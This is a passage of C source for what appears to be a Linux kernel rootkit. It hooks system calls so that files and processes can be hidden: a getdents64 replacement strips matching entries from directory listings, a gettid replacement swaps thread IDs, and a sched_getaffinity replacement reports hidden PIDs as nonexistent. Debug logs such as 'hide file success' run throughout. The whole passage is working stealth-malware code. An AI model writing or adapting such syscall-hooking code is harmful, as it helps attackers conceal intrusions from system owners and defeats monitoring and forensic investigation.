	pcur = pdirent;
	if (!copy_from_user(pdirent, dirent, ret)) {
#ifdef DEBUG_GETDENTS64
		DLog("sys_getdents64 copy_from_user success!");	
#endif
	}
	else {
#ifdef DEBUG_GETDENTS64
		DLog("sys_getdents64 copy_from_user failure~~");
#endif
		goto out;
	}
	while ( buflen > 0)
	{
		buflen -= pcur->d_reclen;
		strcpy(fullname, pwd);
		strcat(fullname, pcur->d_name);
		if ( 0 == check_files(fullname) )
		{
#ifdef DEBUG_GETDENTS64
			DLog("hide file [%s] success!", fullname);
#endif
			ret -= pcur->d_reclen;
			memmove(pcur, (char *)pcur + pcur->d_reclen, buflen);
		}
		else
		{
			pcur = (struct linux_dirent64*)((char*)pcur + pcur->d_reclen ) ;
		}
	}
	if (!copy_to_user(dirent, pdirent, ret)) {
#ifdef DEBUG_GETDENTS64
		DLog("sys_getdents64 copy_from_user success!");
#endif
	}
	else {
#ifdef DEBUG_GETDENTS64
		DLog("sys_getdents64 copy_from_user failure~~");
#endif
	}
out:
	AvoidNull(kfree, pwd);
	AvoidNull(kfree, fullname);
	AvoidNull(kfree, pdirent);
	return ret;
}

/**
 * 	sys_gettid - 224 - 20 - kernel/sys.c
 */
#define DEBUG_GETTID
static asmlinkage long new_sys_gettid(void) {
	long ret;
	ret = original_sys_gettid();
	
	if (ret == clone_tid)
	{
		int tid;

		tid = get_hide_proc(clone_lasttid++);
#ifdef DEGBUG_GETTID
		DLog("hide tid [%d] success!", tid);
#endif 
		if (tid)
		{
			ret = tid;
		}
	}

	return ret;
}

/**
 * 	sched_getaffinity - 242 - 21 - kernel/sched/core.c
 */
#define DEBUG_GETAFFINITY
static asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr) {
	long ret = 0;

	if (0 == check_procs(pid))
	{
		ret = -ESRCH;
#ifdef DEBUG_GETAFFINITY
		DLog("hide pid [%d] success!", pid);
#endif				
		goto out;
	}
	
	ret = original_sys_sched_getaffinity(pid, len, user_mask_ptr);
out:
	return ret;
}











